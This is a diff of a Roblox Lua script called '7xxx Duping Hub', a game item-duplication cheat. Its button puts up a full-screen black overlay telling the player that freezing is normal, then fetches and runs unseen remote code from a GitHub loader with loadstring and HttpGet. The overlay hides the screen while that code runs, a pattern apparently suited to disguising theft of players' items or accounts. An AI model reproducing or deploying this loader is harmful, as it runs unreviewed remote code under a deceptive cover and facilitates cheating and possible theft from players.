@@ -1,117 +1,113 @@
--- Create the freeze screen function
-local function createFreezeScreen()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "FreezeScreen"
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+-- Create main UI
+local player = game:GetService("Players").LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "DupingUI"
+gui.Parent = player:WaitForChild("PlayerGui")
 
-    -- Create a semi-transparent background
-    local background = Instance.new("Frame")
-    background.Name = "Background"
-    background.Size = UDim2.new(1, 0, 1, 0)
-    background.Position = UDim2.new(0, 0, 0, 0)
-    background.BackgroundColor3 = Color3.new(0, 0, 0)
-    background.BackgroundTransparency = 0.7
-    background.Parent = screenGui
+-- Main frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 150)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75) -- Center screen
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = gui
 
-    -- Create the warning text
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Name = "WarningText"
-    textLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
-    textLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.TextColor3 = Color3.new(1, 0, 0)
-    textLabel.Font = Enum.Font.SourceSansBold
-    textLabel.TextSize = 24
-    textLabel.Text = "PLS WAIT - It's normal to freeze your game when duping"
-    textLabel.TextWrapped = true
-    textLabel.TextXAlignment = Enum.TextXAlignment.Center
-    textLabel.TextYAlignment = Enum.TextYAlignment.Center
-    textLabel.Parent = screenGui
+-- Round corners
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = mainFrame
 
-    -- Add a loading spinner
-    local spinner = Instance.new("ImageLabel")
-    spinner.Name = "Spinner"
-    spinner.Size = UDim2.new(0, 50, 0, 50)
-    spinner.Position = UDim2.new(0.5, -25, 0.6, 0)
-    spinner.BackgroundTransparency = 1
-    spinner.Image = "rbxassetid://5644704149" -- Default loading spinner image
-    spinner.Parent = screenGui
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "7xxx Duping Hub"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.Parent = mainFrame
 
-    -- Animate the spinner
+-- Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.8, 0, 0, 40)
+button.Position = UDim2.new(0.1, 0, 0.6, -20)
+button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.Gotham
+button.TextSize = 16
+button.Text = "Start Duping Process"
+button.Parent = mainFrame
+
+-- Button corner
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 6)
+buttonCorner.Parent = button
+
+-- Function to create freeze screen
+local function showFreezeMessage()
+    local freezeGui = Instance.new("ScreenGui")
+    freezeGui.Name = "FreezeMessage"
+    freezeGui.IgnoreGuiInset = true
+    freezeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    freezeGui.Parent = player:WaitForChild("PlayerGui")
+    
+    -- Black background
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.Position = UDim2.new(0, 0, 0, 0)
+    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    bg.Parent = freezeGui
+    
+    -- Warning text
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(0.9, 0, 0, 100)
+    text.Position = UDim2.new(0.05, 0, 0.5, -50)
+    text.BackgroundTransparency = 1
+    text.Text = "PLS WAIT - It's normal to freeze your game when duping"
+    text.TextColor3 = Color3.new(1, 1, 1)
+    text.Font = Enum.Font.SourceSansBold
+    text.TextSize = 24
+    text.TextWrapped = true
+    text.TextXAlignment = Enum.TextXAlignment.Center
+    text.TextYAlignment = Enum.TextYAlignment.Center
+    text.Parent = freezeGui
+    
+    -- Loading dots animation
     coroutine.wrap(function()
-        while spinner and spinner.Parent do
-            spinner.Rotation = spinner.Rotation + 5
-            task.wait()
+        local dots = {".", "..", "...", "...."}
+        while freezeGui and freezeGui.Parent do
+            for i = 1, #dots do
+                if not freezeGui or not freezeGui.Parent then break end
+                text.Text = "PLS WAIT - It's normal to freeze your game when duping"..dots[i]
+                task.wait(0.5)
+            end
         end
     end)()
-
-    return screenGui
+    
+    return freezeGui
 end
 
--- Create the main UI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "DupingUI"
-ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
-
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 300, 0, 200)
-Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Frame.BorderSizePixel = 0
-Frame.Parent = ScreenGui
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 8)
-UICorner.Parent = Frame
-
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Position = UDim2.new(0, 0, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = "7xxx Duping Hub"
-Title.TextColor3 = Color3.new(1, 1, 1)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 20
-Title.Parent = Frame
-
-local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0.8, 0, 0, 40)
-Button.Position = UDim2.new(0.1, 0, 0.5, -20)
-Button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-Button.Text = "Start Duping Process"
-Button.TextColor3 = Color3.new(1, 1, 1)
-Button.Font = Enum.Font.Gotham
-Button.TextSize = 16
-Button.Parent = Frame
-
-local UICorner2 = Instance.new("UICorner")
-UICorner2.CornerRadius = UDim.new(0, 8)
-UICorner2.Parent = Button
-
 -- Button click handler
-Button.MouseButton1Click:Connect(function()
-    -- Create freeze screen
-    local freezeScreen = createFreezeScreen()
+button.MouseButton1Click:Connect(function()
+    -- Show freeze message
+    local freezeScreen = showFreezeMessage()
     
-    -- Execute after a small delay to ensure freeze screen shows
+    -- Execute after small delay to ensure message shows
     task.delay(0.5, function()
         -- Execute the script
         local success, err = pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
         end)
         
-        -- Remove freeze screen after 15 seconds regardless of success
+        -- Remove freeze screen after 15 seconds
         task.delay(15, function()
             if freezeScreen and freezeScreen.Parent then
                 freezeScreen:Destroy()
             end
             
             if not success then
-                warn("Duping script failed to load:", err)
-                -- You could show an error message here if you want
+                warn("Script failed to load:", err)
             end
         end)
     end)
